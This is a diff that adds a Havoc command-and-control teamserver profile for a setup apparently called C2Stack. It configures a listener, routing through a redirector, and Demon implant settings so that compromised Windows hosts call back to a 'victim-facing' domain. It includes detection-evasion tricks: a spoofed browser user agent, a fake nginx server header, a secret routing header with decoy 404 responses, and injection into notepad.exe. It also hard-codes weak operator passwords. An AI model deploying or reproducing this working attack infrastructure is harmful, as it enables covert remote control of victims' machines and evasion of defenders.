@@ -1,0 +1,81 @@
+# Havoc teamserver profile for C2Stack.
+# - Teamserver control port: 40056 (operators connect via the Qt client on Kali)
+# - HTTP C2 listener on :80 bound for the redirector route /edge/cache/assets
+#   with the C2_HEADER_NAME/VALUE agreed in C2Stack (X-Request-ID: cadre-c2).
+#   Before generating a Demon payload, set Hosts to the hostname/domain the
+#   USER will call back to (the redirector's victim-facing host), and adjust
+#   Uris/Headers to match Docker/.env (HAVOC_URI_PREFIX + C2_HEADER_*).
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "5pider" {
+        Password = "password1234"
+    }
+
+    user "Neo" {
+        Password = "password1234"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "c2stack - http"
+        Hosts        = [
+            "c2.local", # CHANGE ME: victim-facing callback host (redirector host/domain)
+        ]
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+        PortBind     = 80
+        PortConn     = 80
+        Secure       = false # TLS terminates at the redirector; keep off in the DMZ
+        KillDate     = "2030-01-01 00:00:00"
+        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+        Uris = [
+            "/edge/cache/assets/"
+        ]
+
+        # Routing contract with the C2Stack redirector (Docker/.env):
+        # C2_HEADER_NAME: C2_HEADER_VALUE - without it the redirector 404s the
+        # path (decoy behavior), so the agent must send it on every request.
+        Headers = [
+            "X-Request-ID: cadre-c2"
+        ]
+
+        Response {
+            Headers = [
+                "Content-Type: text/plain; charset=utf-8",
+                "Server: nginx",
+                "Access-Control-Allow-Origin: *"
+            ]
+        }
+
+    }
+}
+
+# optional - can be removed if unused.
+Service {
+    Endpoint = "service-endpoint"
+    Password = "service-password"
+}
+
+Demon {
+    Sleep = 2
+    Jitter = 15
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
+    }
+}
